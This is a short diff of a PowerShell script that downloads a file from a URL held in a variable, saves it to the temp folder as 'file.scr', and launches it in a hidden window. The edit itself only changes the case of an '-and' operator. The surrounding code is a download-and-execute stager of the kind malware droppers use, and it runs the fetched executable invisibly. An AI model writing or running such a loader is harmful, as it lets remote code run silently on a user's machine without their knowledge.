@@ -8,7 +8,7 @@ $oPT = "$env:Temp\file.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
 
 # Check if the file exists and is not empty
-if (Test-Path $oPT -PathType Leaf -AND (Get-Item $oPT).length -gt 0) {
+if (Test-Path $oPT -PathType Leaf -and (Get-Item $oPT).length -gt 0) {
     try {
         # Start the process
         Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
